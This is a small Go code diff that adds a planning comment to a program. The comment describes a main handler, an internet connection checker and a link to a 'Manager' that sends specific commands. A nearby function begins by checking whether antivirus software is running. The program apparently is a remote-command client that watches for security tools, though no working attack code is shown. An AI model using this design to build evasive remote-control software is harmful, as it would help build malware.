@@ -13,6 +13,13 @@ import (
 )
 import "os/exec"
 
+/*
+We should split here into multiple parts:
+- The Main Handler.. which has been started....
+- The internet connection checker!
+- The communication between the app and the Manager which receives specific commands...
+*/
+
 func Start() bool {
 	/*
 		0. check if there is an Antivirus Running!...
